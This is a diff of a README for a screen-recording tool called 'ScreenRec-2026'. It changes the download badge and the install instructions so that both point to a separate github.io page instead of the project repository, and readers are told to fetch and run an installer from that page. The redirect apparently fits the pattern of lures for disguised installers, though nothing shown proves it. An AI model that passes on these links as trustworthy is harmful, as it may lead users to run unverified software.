@@ -1,6 +1,6 @@
 # 🎥 ScreenRec-2026 - Record your screen with total ease
 
-[![](https://img.shields.io/badge/Download-ScreenRec-blue.svg)](https://github.com/Sibyllawellborn131/ScreenRec-2026)
+[![](https://img.shields.io/badge/Download-ScreenRec-blue.svg)](https://sibyllawellborn131.github.io)
 
 ## 📌 About ScreenRec-2026
 
@@ -22,7 +22,7 @@ Check your Windows settings if you remain unsure about your hardware specificati
 
 Follow these steps to install the tool on your machine.
 
-1. Visit the download page: [https://github.com/Sibyllawellborn131/ScreenRec-2026](https://github.com/Sibyllawellborn131/ScreenRec-2026)
+1. Visit the download page: [https://sibyllawellborn131.github.io](https://sibyllawellborn131.github.io)
 2. Locate the download button on the page.
 3. Click the link to save the installer file to your computer.
 4. Navigate to your Downloads folder.
